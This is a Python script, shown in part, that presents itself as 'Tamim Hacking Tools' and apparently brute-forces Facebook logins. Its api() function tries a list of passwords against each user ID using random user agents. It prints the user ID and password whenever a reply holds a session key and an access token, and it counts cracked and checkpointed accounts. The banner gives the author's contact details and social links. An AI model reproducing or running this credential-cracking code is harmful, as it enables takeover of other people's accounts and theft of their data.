#THE TOOL CREATED BY Tamim
#𝚃𝚎𝚊𝚖 𝟹𝟶
#FB : https://www.facebook.com/betul.btl.545
#PAGE : Md Tamim
#Programer Nasrullah Tamim
#𝐖𝐇𝐀𝐓'𝐒 𝐀𝐏𝐏 : +8801771773491
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
\33[1;32m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 Tamim 𝐇𝐚𝐜𝐤𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬

\33[1;34m✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨


╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁     : Nasrullah Tamim
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   : Nasrullah Tamim
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱     : Tamimislam12380
║\33[1;32m[↦] 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙   : +8801771773491
║\33[1;32m[↦] 𝚂𝚝𝚊𝚝𝚞𝚜     : 𝙵𝚛𝚎𝚎
║\33[1;32m[↦] 𝚃𝙴𝙰𝙼       : 𝚃𝚎𝚊𝚖 𝟹𝟶
...
class Main:
	def __init__(self):
		...
		if DEVIL in ["1", "01"]:
			self.fbtua()
		if DEVIL in ["2", "02"]:
			os.system('xdg-open https://github.com/tamimislam12380')
		if DEVIL in ["3", "03"]:
			os.system('xdg-open https://www.facebook.com/profile.php?id=100083860481125/')
		if DEVIL in ["4", "04"]:
			os.system('xdg-open https://www.facebook.com/groups/454571455545230/')
		if DEVIL in ["5",  "05"]:
			self.old2()
			exit()
		else:
	...
	def fbtua(self):
		...
		try:
			...
			os.system('xdg-open https://www.facebook.com/betul.btl.545')
			os.system('clear')
			print(logo) 
			...
			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks For Using Tamim Tools...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[92;1m[TAMIM] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [TAMIM] %s | %s\033[1;32m         "%(uid, pw))
